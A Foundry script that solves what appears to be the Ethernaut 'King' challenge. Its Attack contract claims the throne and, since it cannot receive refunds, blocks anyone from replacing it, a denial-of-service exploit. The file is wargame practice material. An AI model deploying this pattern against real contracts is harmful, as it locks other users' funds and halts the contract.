// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/09_King.sol";
import {Script, console} from "forge-std/Script.sol";

contract KingSolve is Script {
    King king = King(payable(0x0B0Dc8B0D151879f8Bc77c98b6B4364440159Bb5));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: king.prize()}(address(king));
        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(address king) payable {
        (bool success,) = king.call{value: msg.value}("");
        require(success);
    }
}
